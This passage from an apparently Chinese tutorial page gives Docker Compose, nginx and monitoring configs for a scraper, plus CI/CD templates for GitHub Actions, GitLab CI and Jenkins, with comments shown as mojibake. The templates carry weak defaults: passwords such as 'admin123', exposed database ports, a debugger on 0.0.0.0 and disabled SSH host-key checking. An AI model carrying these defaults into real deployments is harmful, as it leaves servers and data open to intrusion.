      MONGO_INITDB_ROOT_PASSWORD: ${MONGO_PASSWORD:-admin123}
      MONGO_INITDB_DATABASE: scraper_db
    volumes:
      - mongodb_data:/data/db
      - mongodb_config:/data/configdb
    ports:
      - &quot;27017:27017&quot;
    healthcheck:
      test: echo 'db.runCommand(&quot;ping&quot;).ok' | mongosh localhost:27017/test --quiet
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 20s
    networks:
      - scraper_network

  # Redis ç¼“å­˜
  redis:
    image: redis:7-alpine
    container_name: scraper_redis
    restart: unless-stopped
    command: redis-server --requirepass ${REDIS_PASSWORD:-redis123} --maxmemory 256mb --maxmemory-policy allkeys-lru
    volumes:
      - redis_data:/data
    ports:
      - &quot;6379:6379&quot;
    healthcheck:
      test: [&quot;CMD&quot;, &quot;redis-cli&quot;, &quot;ping&quot;]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - scraper_network

  # Nginx (å¯é€‰)
  nginx:
    image: nginx:alpine
    container_name: scraper_nginx
    restart: unless-stopped
    ports:
      - &quot;80:80&quot;
      - &quot;443:443&quot;
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./data/static:/usr/share/nginx/html:ro
    depends_on:
      - scraper
    networks:
      - scraper_network

  # ç›‘æ§ (å¯é€‰)
  prometheus:
    image: prom/prometheus:latest
    container_name: scraper_prometheus
    restart: unless-stopped
    command:
      - &quot;--config.file=/etc/prometheus/prometheus.yml&quot;
      - &quot;--storage.tsdb.path=/prometheus&quot;
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml:ro
      - prometheus_data:/prometheus
    ports:
      - &quot;9090:9090&quot;
    networks:
      - scraper_network

  # å¯è§†åŒ–ç›‘æ§
  grafana:
    image: grafana/grafana:latest
    container_name: scraper_grafana
    restart: unless-stopped
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin123}
    volumes:
      - grafana_data:/var/lib/grafana
    ports:
      - &quot;3000:3000&quot;
    depends_on:
      - prometheus
    networks:
      - scraper_network

networks:
  scraper_network:
    driver: bridge

volumes:
  mongodb_data:
  mongodb_config:
  redis_data:
  prometheus_data:
  grafana_data:
</code></pre>
<h3>4. docker-compose.dev.yml (å¼€å‘ç¯å¢ƒ)</h3>
<pre><code class="language-yaml">version: &quot;3.8&quot;

services:
  scraper:
    build:
      context: .
      dockerfile: docker/Dockerfile.dev
    container_name: scraper_dev
    environment:
      - MONGODB_URI=mongodb://mongodb:27017/
      - REDIS_HOST=redis
      - LOG_LEVEL=DEBUG
    volumes:
      - .:/app # æŒ‚è½½ä»£ç ç›®å½•ï¼Œæ”¯æŒçƒ­é‡è½½
      - /app/__pycache__ # æ’é™¤ç¼“å­˜
    ports:
      - &quot;8000:8000&quot;
      - &quot;5678:5678&quot; # è°ƒè¯•ç«¯å£
    depends_on:
      - mongodb
      - redis
    networks:
      - scraper_network
    command: python -m debugpy --listen 0.0.0.0:5678 --wait-for-client app/main.py

  mongodb:
    image: mongo:7.0
    container_name: scraper_mongodb_dev
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: admin123
    ports:
      - &quot;27017:27017&quot;
    volumes:
      - mongodb_dev_data:/data/db
    networks:
      - scraper_network

  redis:
    image: redis:7-alpine
    container_name: scraper_redis_dev
    command: redis-server --requirepass redis123
    ports:
      - &quot;6379:6379&quot;
    networks:
      - scraper_network

networks:
  scraper_network:
    driver: bridge

volumes:
  mongodb_dev_data:
</code></pre>
<h3>5. .dockerignore</h3>
<pre><code># Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
venv/
env/
ENV/
*.egg-info/
dist/
build/

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# Git
.git/
.gitignore

# IDE
.vscode/
.idea/
*.swp
*.swo

# ç¯å¢ƒå˜é‡
.env
.env.local

# Docker
docker-compose.yml
Dockerfile*

# æµ‹è¯•
.pytest_cache/
.coverage
htmlcov/

# æ–‡æ¡£
docs/
*.md
!README.md
</code></pre>
<h3>6. scripts/entrypoint.sh</h3>
<pre><code class="language-bash">#!/bin/bash
set -e

echo &quot;ğŸš€ Starting scraper application...&quot;

# ç­‰å¾… MongoDB å°±ç»ª
echo &quot;â³ Waiting for MongoDB...&quot;
until python -c &quot;
import pymongo
import sys
try:
    client = pymongo.MongoClient('${MONGODB_URI}', serverSelectionTimeoutMS=2000)
    client.server_info()
    print('âœ… MongoDB is ready!')
except Exception as e:
    print(f'âŒ MongoDB not ready: {e}')
    sys.exit(1)
&quot;; do
  echo &quot;MongoDB is unavailable - sleeping&quot;
  sleep 2
done

# ç­‰å¾… Redis å°±ç»ª
echo &quot;â³ Waiting for Redis...&quot;
until python -c &quot;
import redis
import sys
try:
    r = redis.Redis(host='${REDIS_HOST}', port=${REDIS_PORT}, password='${REDIS_PASSWORD}', socket_connect_timeout=2)
    r.ping()
    print('âœ… Redis is ready!')
except Exception as e:
    print(f'âŒ Redis not ready: {e}')
    sys.exit(1)
&quot;; do
  echo &quot;Redis is unavailable - sleeping&quot;
  sleep 2
done

# åˆå§‹åŒ–æ•°æ®åº“ (å¯é€‰)
echo &quot;ğŸ”§ Initializing database...&quot;
python -c &quot;
from app.database import init_db
init_db()
print('âœ… Database initialized!')
&quot;

echo &quot;âœ¨ All services are ready!&quot;
echo &quot;ğŸ¯ Starting main application...&quot;

# æ‰§è¡Œä¸»å‘½ä»¤
exec &quot;$@&quot;
</code></pre>
<h3>7. scripts/wait-for-it.sh</h3>
<pre><code class="language-bash">#!/bin/bash
# wait-for-it.sh - ç­‰å¾…æœåŠ¡å¯ç”¨

TIMEOUT=15
QUIET=0
HOST=&quot;&quot;
PORT=&quot;&quot;

while [ $# -gt 0 ]; do
  case &quot;$1&quot; in
    *:* )
      HOST=$(printf &quot;%s\n&quot; &quot;$1&quot;| cut -d : -f 1)
      PORT=$(printf &quot;%s\n&quot; &quot;$1&quot;| cut -d : -f 2)
      shift 1
      ;;
    -t)
      TIMEOUT=&quot;$2&quot;
      shift 2
      ;;
    -q)
      QUIET=1
      shift 1
      ;;
    *)
      echo &quot;Unknown argument: $1&quot;
      exit 1
      ;;
  esac
done

if [ &quot;$HOST&quot; = &quot;&quot; ] || [ &quot;$PORT&quot; = &quot;&quot; ]; then
  echo &quot;Error: you need to provide a host and port to test.&quot;
  exit 1
fi

TIMEOUT_END=$(($(date +%s) + TIMEOUT))

while :; do
  if [ $QUIET -ne 1 ]; then
    echo &quot;Waiting for $HOST:$PORT...&quot;
  fi

  nc -z &quot;$HOST&quot; &quot;$PORT&quot; &gt; /dev/null 2&gt;&amp;1
  result=$?

  if [ $result -eq 0 ]; then
    if [ $QUIET -ne 1 ]; then
      echo &quot;$HOST:$PORT is available!&quot;
    fi
    exit 0
  fi

  if [ &quot;$(date +%s)&quot; -ge &quot;$TIMEOUT_END&quot; ]; then
    echo &quot;Timeout waiting for $HOST:$PORT&quot;
    exit 1
  fi

  sleep 1
done
</code></pre>
<h3>8. nginx/nginx.conf</h3>
<pre><code class="language-nginx">user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events {
    worker_connections 1024;
    use epoll;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    # æ—¥å¿—æ ¼å¼
    log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; '
                    '$status $body_bytes_sent &quot;$http_referer&quot; '
                    '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;';

    access_log /var/log/nginx/access.log main;

    # æ€§èƒ½ä¼˜åŒ–
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    # Gzip å‹ç¼©
    gzip on;
    gzip_vary on;
    gzip_min_length 1000;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml;

    # ä¸Šæ¸¸æœåŠ¡å™¨
    upstream scraper_backend {
        server scraper:8000;
        keepalive 32;
    }

    # ä¸»æœåŠ¡å™¨é…ç½®
    server {
        listen 80;
        server_name localhost;

        # é™æ€æ–‡ä»¶
        location /static/ {
            alias /usr/share/nginx/html/;
            expires 30d;
            add_header Cache-Control &quot;public, immutable&quot;;
        }

        # API ä»£ç†
        location /api/ {
            proxy_pass http://scraper_backend;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # è¶…æ—¶è®¾ç½®
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }

        # å¥åº·æ£€æŸ¥
        location /health {
            access_log off;
            return 200 &quot;healthy\n&quot;;
            add_header Content-Type text/plain;
        }
    }
}
</code></pre>
<h3>9. .env.example</h3>
<pre><code class="language-bash"># MongoDB é…ç½®
MONGODB_URI=mongodb://mongodb:27017/
MONGO_PASSWORD=admin123

# Redis é…ç½®
REDIS_HOST=redis
REDIS_PORT=6379
REDIS_PASSWORD=redis123

# åº”ç”¨é…ç½®
LOG_LEVEL=INFO
DEBUG=false

# Grafana é…ç½®
GRAFANA_PASSWORD=admin123

# ä»£ç†é…ç½® (å¯é€‰)
USE_PROXY=false
PROXY_URL=http://proxy:7890
</code></pre>
<h3>10. monitoring/prometheus.yml</h3>
<pre><code class="language-yaml">global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  # Prometheus è‡ªèº«
  - job_name: &quot;prometheus&quot;
    static_configs:
      - targets: [&quot;localhost:9090&quot;]

  # çˆ¬è™«åº”ç”¨
  - job_name: &quot;scraper&quot;
    static_configs:
      - targets: [&quot;scraper:8000&quot;]
    metrics_path: &quot;/metrics&quot;

  # MongoDB Exporter (å¦‚æœä½¿ç”¨)
  - job_name: &quot;mongodb&quot;
    static_configs:
      - targets: [&quot;mongodb-exporter:9216&quot;]

  # Redis Exporter (å¦‚æœä½¿ç”¨)
  - job_name: &quot;redis&quot;
    static_configs:
      - targets: [&quot;redis-exporter:9121&quot;]
</code></pre>
<h3>11. requirements-dev.txt</h3>
<pre><code class="language-txt"># å¼€å‘å·¥å…·
debugpy&gt;=1.8.0
ipython&gt;=8.18.0
pytest&gt;=7.4.0
pytest-cov&gt;=4.1.0
pytest-mock&gt;=3.12.0
black&gt;=23.12.0
flake8&gt;=6.1.0
mypy&gt;=1.7.0
</code></pre>
<hr />
<h2>ğŸš€ ä½¿ç”¨æŒ‡å—</h2>
<h3>ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h3>
<pre><code class="language-bash"># 1. å…‹éš†é¡¹ç›®
git clone &lt;your-repo&gt;
cd docker_scraper

# 2. é…ç½®ç¯å¢ƒå˜é‡
cp .env.example .env
vim .env  # ä¿®æ”¹å¯†ç ç­‰é…ç½®

# 3. æ„å»ºå¹¶å¯åŠ¨
docker-compose up -d

# 4. æŸ¥çœ‹æ—¥å¿—
docker-compose logs -f scraper

# 5. æŸ¥çœ‹çŠ¶æ€
docker-compose ps

# 6. åœæ­¢æœåŠ¡
docker-compose down
</code></pre>
<h3>å¼€å‘ç¯å¢ƒ</h3>
<pre><code class="language-bash"># ä½¿ç”¨å¼€å‘é…ç½®
docker-compose -f docker-compose.dev.yml up

# è¿›å…¥å®¹å™¨
docker exec -it scraper_dev bash

# è¿è¡Œæµ‹è¯•
docker exec scraper_dev pytest

# æŸ¥çœ‹æ—¥å¿—
docker-compose -f docker-compose.dev.yml logs -f
</code></pre>
<h3>å¸¸ç”¨å‘½ä»¤</h3>
<pre><code class="language-bash"># é‡æ–°æ„å»ºé•œåƒ
docker-compose build --no-cache

# åªå¯åŠ¨ç‰¹å®šæœåŠ¡
docker-compose up -d mongodb redis

# æŸ¥çœ‹èµ„æºä½¿ç”¨
docker stats

# æ¸…ç†æœªä½¿ç”¨çš„èµ„æº
docker system prune -a

# å¯¼å‡ºæ•°æ®
docker exec scraper_mongodb mongodump --out /tmp/backup
docker cp scraper_mongodb:/tmp/backup ./backup

# å¯¼å…¥æ•°æ®
docker cp ./backup scraper_mongodb:/tmp/
docker exec scraper_mongodb mongorestore /tmp/backup
</code></pre>
<hr />
<h2>ğŸ“Š ç›‘æ§å’Œç»´æŠ¤</h2>
<h3>è®¿é—® Grafana</h3>
<pre><code>URL: http://localhost:3000
ç”¨æˆ·å: admin
å¯†ç : (åœ¨ .env ä¸­è®¾ç½®çš„ GRAFANA_PASSWORD)
</code></pre>
<h3>æŸ¥çœ‹ Prometheus æŒ‡æ ‡</h3>
<pre><code>URL: http://localhost:9090
</code></pre>
<h3>å¥åº·æ£€æŸ¥</h3>
<pre><code class="language-bash"># åº”ç”¨å¥åº·æ£€æŸ¥
curl http://localhost/health

# Docker å¥åº·çŠ¶æ€
docker inspect --format='{{.State.Health.Status}}' scraper_app
</code></pre>
<hr />
<h2>ğŸ”§ è¿›é˜¶é…ç½®</h2>
<h3>å¤šå‰¯æœ¬éƒ¨ç½²</h3>
<pre><code class="language-yaml"># docker-compose.yml
services:
  scraper:
    # ... å…¶ä»–é…ç½®
    deploy:
      replicas: 3
      resources:
        limits:
          cpus: &quot;0.5&quot;
          memory: 512M
        reservations:
          cpus: &quot;0.25&quot;
          memory: 256M
</code></pre>
<h3>ä½¿ç”¨ Docker Swarm</h3>
<pre><code class="language-bash"># åˆå§‹åŒ– Swarm
docker swarm init

# éƒ¨ç½²æœåŠ¡æ ˆ
docker stack deploy -c docker-compose.yml scraper_stack

# æŸ¥çœ‹æœåŠ¡
docker service ls

# æ‰©å®¹
docker service scale scraper_stack_scraper=5
</code></pre>
<h3>ä½¿ç”¨å¤–éƒ¨é…ç½®</h3>
<pre><code class="language-yaml"># docker-compose.yml
services:
  scraper:
    configs:
      - source: app_config
        target: /app/config.yaml

configs:
  app_config:
    file: ./config.yaml
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-55">Docker éƒ¨ç½²</a></li>
<li><a href="#section-73">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
<li><a href="#section-56">ç›‘æ§å‘Šè­¦</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-72">
                                                <h2>[R71] CI/CD Pipeline</h2>
                                                <h1>R71: CI/CD æµæ°´çº¿æ¨¡æ¿</h1>
<p>è‡ªåŠ¨åŒ–æ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²é…ç½®ï¼Œæ”¯æŒ GitHub Actionsã€GitLab CI å’Œ Jenkinsã€‚</p>
<hr />
<h2>ğŸ“ é¡¹ç›®ç»“æ„</h2>
<pre><code>.
â”œâ”€â”€ .github/
â”‚   â””â”€â”€ workflows/
â”‚       â”œâ”€â”€ ci.yml              # æŒç»­é›†æˆ
â”‚       â”œâ”€â”€ cd.yml              # æŒç»­éƒ¨ç½²
â”‚       â””â”€â”€ docker-publish.yml  # Docker é•œåƒå‘å¸ƒ
â”œâ”€â”€ .gitlab-ci.yml              # GitLab CI
â”œâ”€â”€ Jenkinsfile                 # Jenkins Pipeline
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ run_tests.sh
â”‚   â”œâ”€â”€ build.sh
â”‚   â””â”€â”€ deploy.sh
â””â”€â”€ tests/
    â”œâ”€â”€ unit/
    â”œâ”€â”€ integration/
    â””â”€â”€ e2e/
</code></pre>
<hr />
<h2>GitHub Actions</h2>
<h3>1. .github/workflows/ci.yml (æŒç»­é›†æˆ)</h3>
<pre><code class="language-yaml">name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

env:
  PYTHON_VERSION: &quot;3.11&quot;

jobs:
  # ä»£ç è´¨é‡æ£€æŸ¥
  lint:
    name: Code Quality
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: &quot;pip&quot;

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install flake8 black mypy pylint

      - name: Run Black (æ ¼å¼æ£€æŸ¥)
        run: black --check .

      - name: Run Flake8 (ä»£ç è§„èŒƒ)
        run: flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics

      - name: Run MyPy (ç±»å‹æ£€æŸ¥)
        run: mypy . --ignore-missing-imports

      - name: Run Pylint
        run: pylint **/*.py --fail-under=8.0

  # å•å…ƒæµ‹è¯•
  test:
    name: Unit Tests
    runs-on: ubuntu-latest
    needs: lint

    strategy:
      matrix:
        python-version: [&quot;3.10&quot;, &quot;3.11&quot;, &quot;3.12&quot;]

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: &quot;pip&quot;

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-dev.txt

      - name: Run tests with coverage
        run: |
          pytest tests/unit/ \
            --cov=app \
            --cov-report=xml \
            --cov-report=html \
            --junitxml=junit.xml

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v4
        with:
          files: ./coverage.xml
          flags: unittests
          name: codecov-${{ matrix.python-version }}

      - name: Upload test results
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: test-results-${{ matrix.python-version }}
          path: |
            junit.xml
            htmlcov/

  # é›†æˆæµ‹è¯•
  integration-test:
    name: Integration Tests
    runs-on: ubuntu-latest
    needs: test

    services:
      mongodb:
        image: mongo:7.0
        env:
          MONGO_INITDB_ROOT_USERNAME: admin
          MONGO_INITDB_ROOT_PASSWORD: admin123
        ports:
          - 27017:27017
        options: &gt;-
          --health-cmd &quot;echo 'db.runCommand(\&quot;ping\&quot;).ok' | mongosh localhost:27017/test --quiet&quot;
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: &gt;-
          --health-cmd &quot;redis-cli ping&quot;
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: &quot;pip&quot;

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install -r requirements-dev.txt

      - name: Run integration tests
        env:
          MONGODB_URI: mongodb://admin:admin123@localhost:27017/
          REDIS_HOST: localhost
          REDIS_PORT: 6379
        run: |
          pytest tests/integration/ -v --tb=short

  # å®‰å…¨æ‰«æ
  security:
    name: Security Scan
    runs-on: ubuntu-latest
    needs: lint

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}

      - name: Install dependencies
        run: |
          pip install safety bandit

      - name: Check for security vulnerabilities (Safety)
        run: safety check --json

      - name: Run Bandit (ä»£ç å®‰å…¨æ‰«æ)
        run: bandit -r app/ -f json -o bandit-report.json

      - name: Upload security reports
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: security-reports
          path: |
            bandit-report.json

  # Docker æ„å»ºæµ‹è¯•
  docker-build:
    name: Docker Build Test
    runs-on: ubuntu-latest
    needs: test

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          file: ./docker/Dockerfile
          push: false
          tags: scraper:test
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Test Docker image
        run: |
          docker run --rm scraper:test python -c &quot;import app; print('âœ… Import successful')&quot;
</code></pre>
<h3>2. .github/workflows/cd.yml (æŒç»­éƒ¨ç½²)</h3>
<pre><code class="language-yaml">name: CD

on:
  push:
    tags:
      - &quot;v*&quot;
  workflow_dispatch:

env:
  PYTHON_VERSION: &quot;3.11&quot;
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  # æ„å»ºå¹¶å‘å¸ƒ Docker é•œåƒ
  build-and-push:
    name: Build and Push Docker Image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,prefix={{branch}}-

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          file: ./docker/Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  # éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ
  deploy:
    name: Deploy to Production
    runs-on: ubuntu-latest
    needs: build-and-push
    environment:
      name: production
      url: https://scraper.example.com

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup SSH
        uses: webfactory/ssh-agent@v0.9.0
        with:
          ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}

      - name: Deploy to server
        run: |
          ssh -o StrictHostKeyChecking=no ${{ secrets.SSH_USER }}@${{ secrets.SSH_HOST }} &lt;&lt; 'EOF'
            cd /opt/scraper
            docker-compose pull
            docker-compose up -d
            docker-compose ps
          EOF

      - name: Health check
        run: |
          sleep 10
          curl -f https://scraper.example.com/health || exit 1

      - name: Notify deployment
        if: always()
        uses: 8398a7/action-slack@v3
        with:
          status: ${{ job.status }}
          text: &quot;Deployment ${{ job.status }}&quot;
          webhook_url: ${{ secrets.SLACK_WEBHOOK }}
</code></pre>
<h3>3. .github/workflows/docker-publish.yml</h3>
<pre><code class="language-yaml">name: Publish Docker Image

on:
  release:
    types: [published]

jobs:
  push-to-registry:
    name: Push to Docker Hub
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Log in to Docker Hub
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ secrets.DOCKER_USERNAME }}/scraper
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=raw,value=latest

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
</code></pre>
<hr />
<h2>GitLab CI</h2>
<h3>.gitlab-ci.yml</h3>
<pre><code class="language-yaml"># å®šä¹‰é˜¶æ®µ
stages:
  - lint
  - test
  - build
  - deploy

# å…¨å±€å˜é‡
variables:
  PYTHON_VERSION: &quot;3.11&quot;
  PIP_CACHE_DIR: &quot;$CI_PROJECT_DIR/.cache/pip&quot;
  DOCKER_DRIVER: overlay2
  DOCKER_TLS_CERTDIR: &quot;/certs&quot;

# ç¼“å­˜é…ç½®
cache:
  paths:
    - .cache/pip
    - venv/

# ä»£ç è´¨é‡æ£€æŸ¥
lint:flake8:
  stage: lint
  image: python:$PYTHON_VERSION
  before_script:
    - pip install flake8 black mypy
  script:
    - black --check .
    - flake8 . --count --statistics
    - mypy . --ignore-missing-imports
  only:
    - merge_requests
    - main
    - develop

# å•å…ƒæµ‹è¯•
test:unit:
  stage: test
  image: python:$PYTHON_VERSION
  services:
    - mongo:7.0
    - redis:7-alpine
  variables:
    MONGODB_URI: &quot;mongodb://mongo:27017/&quot;
    REDIS_HOST: &quot;redis&quot;
  before_script:
    - python -m venv venv
    - source venv/bin/activate
    - pip install -r requirements.txt -r requirements-dev.txt
  script:
    - pytest tests/unit/ --cov=app --cov-report=xml --cov-report=term
  coverage: '/^TOTAL.+?(\d+\%)$/'
  artifacts:
    reports:
      coverage_report:
        coverage_format: cobertura
        path: coverage.xml
    paths:
      - htmlcov/
    expire_in: 1 week

# é›†æˆæµ‹è¯•
test:integration:
  stage: test
  image: python:$PYTHON_VERSION
  services:
    - mongo:7.0
    - redis:7-alpine
  before_script:
    - python -m venv venv
    - source venv/bin/activate
    - pip install -r requirements.txt -r requirements-dev.txt
  script:
    - pytest tests/integration/ -v
  only:
    - merge_requests
    - main

# å®‰å…¨æ‰«æ
security:scan:
  stage: test
  image: python:$PYTHON_VERSION
  before_script:
    - pip install safety bandit
  script:
    - safety check
    - bandit -r app/ -f json -o bandit-report.json
  artifacts:
    paths:
      - bandit-report.json
    expire_in: 1 week
  allow_failure: true

# æ„å»º Docker é•œåƒ
build:docker:
  stage: build
  image: docker:24-dind
  services:
    - docker:24-dind
  before_script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA -f docker/Dockerfile .
    - docker tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA $CI_REGISTRY_IMAGE:latest
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
    - docker push $CI_REGISTRY_IMAGE:latest
  only:
    - main
    - tags

# éƒ¨ç½²åˆ°æµ‹è¯•ç¯å¢ƒ
deploy:staging:
  stage: deploy
  image: alpine:latest
  before_script:
    - apk add --no-cache openssh-client
    - eval $(ssh-agent -s)
    - echo &quot;$SSH_PRIVATE_KEY&quot; | tr -d '\r' | ssh-add -
    - mkdir -p ~/.ssh
    - chmod 700 ~/.ssh
  script:
    - ssh -o StrictHostKeyChecking=no $SSH_USER@$STAGING_HOST &quot;
      cd /opt/scraper &amp;&amp;
      docker-compose pull &amp;&amp;
      docker-compose up -d
      &quot;
  environment:
    name: staging
    url: https://staging.scraper.example.com
  only:
    - develop

# éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ
deploy:production:
  stage: deploy
  image: alpine:latest
  before_script:
    - apk add --no-cache openssh-client
    - eval $(ssh-agent -s)
    - echo &quot;$SSH_PRIVATE_KEY&quot; | tr -d '\r' | ssh-add -
  script:
    - ssh -o StrictHostKeyChecking=no $SSH_USER@$PRODUCTION_HOST &quot;
      cd /opt/scraper &amp;&amp;
      docker-compose pull &amp;&amp;
      docker-compose up -d &amp;&amp;
      docker-compose ps
      &quot;
  environment:
    name: production
    url: https://scraper.example.com
  when: manual
  only:
    - main
    - tags
</code></pre>
<hr />
<h2>Jenkins Pipeline</h2>
<h3>Jenkinsfile</h3>
<pre><code class="language-groovy">pipeline {
    agent any

    environment {
        PYTHON_VERSION = '3.11'
        DOCKER_REGISTRY = 'docker.io'
        DOCKER_IMAGE = 'myuser/scraper'
        DOCKER_CREDENTIALS = credentials('docker-hub-credentials')
    }

    options {
        buildDiscarder(logRotator(numToKeepStr: '10'))
        timestamps()
        timeout(time: 1, unit: 'HOURS')
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
                sh 'git rev-parse --short HEAD &gt; .git/commit-id'
                script {
                    env.GIT_COMMIT_ID = readFile('.git/commit-id').trim()
                }
            }
        }

        stage('Setup Python') {
            steps {
                sh '''
                    python${PYTHON_VERSION} -m venv venv
                    . venv/bin/activate
                    pip install --upgrade pip
                    pip install -r requirements.txt -r requirements-dev.txt
                '''
            }
        }

        stage('Lint') {
            parallel {
                stage('Black') {
                    steps {
                        sh '''
                            . venv/bin/activate
                            black --check .
                        '''
                    }
                }
                stage('Flake8') {
                    steps {
                        sh '''
                            . venv/bin/activate
                            flake8 . --count --statistics
                        '''
                    }
                }
                stage('MyPy') {
                    steps {
                        sh '''
                            . venv/bin/activate
                            mypy . --ignore-missing-imports
                        '''
                    }
                }
            }
        }

        stage('Test') {
            steps {
                sh '''
                    . venv/bin/activate
                    pytest tests/ \
                        --cov=app \
                        --cov-report=xml \
                        --cov-report=html \
                        --junitxml=junit.xml
                '''
            }
            post {
                always {
                    junit 'junit.xml'
                    publishHTML(target: [
                        allowMissing: false,
                        alwaysLinkToLastBuild: true,
                        keepAll: true,
                        reportDir: 'htmlcov',
                        reportFiles: 'index.html',
                        reportName: 'Coverage Report'
                    ])
                }
            }
        }

        stage('Security Scan') {
            steps {
                sh '''
                    . venv/bin/activate
                    safety check || true
                    bandit -r app/ -f json -o bandit-report.json || true
                '''
            }
            post {
                always {
                    archiveArtifacts artifacts: 'bandit-report.json', allowEmptyArchive: true
                }
            }
        }

        stage('Build Docker') {
            steps {
                script {
                    docker.build(&quot;${DOCKER_IMAGE}:${GIT_COMMIT_ID}&quot;, &quot;-f docker/Dockerfile .&quot;)
                    docker.build(&quot;${DOCKER_IMAGE}:latest&quot;, &quot;-f docker/Dockerfile .&quot;)
                }
            }
        }

        stage('Push Docker') {
            when {
                branch 'main'
            }
            steps {
                script {
                    docker.withRegistry('', 'docker-hub-credentials') {
                        docker.image(&quot;${DOCKER_IMAGE}:${GIT_COMMIT_ID}&quot;).push()
                        docker.image(&quot;${DOCKER_IMAGE}:latest&quot;).push()
                    }
                }
            }
        }

        stage('Deploy to Staging') {
            when {
                branch 'develop'
            }
            steps {
                sshagent(['ssh-credentials']) {
                    sh '''
                        ssh -o StrictHostKeyChecking=no user@staging-host &quot;
                            cd /opt/scraper &amp;&amp;
                            docker-compose pull &amp;&amp;
                            docker-compose up -d
                        &quot;
                    '''
                }
            }
        }

        stage('Deploy to Production') {
            when {
                branch 'main'
            }
            steps {
                input message: 'Deploy to production?', ok: 'Deploy'
                sshagent(['ssh-credentials']) {
                    sh '''
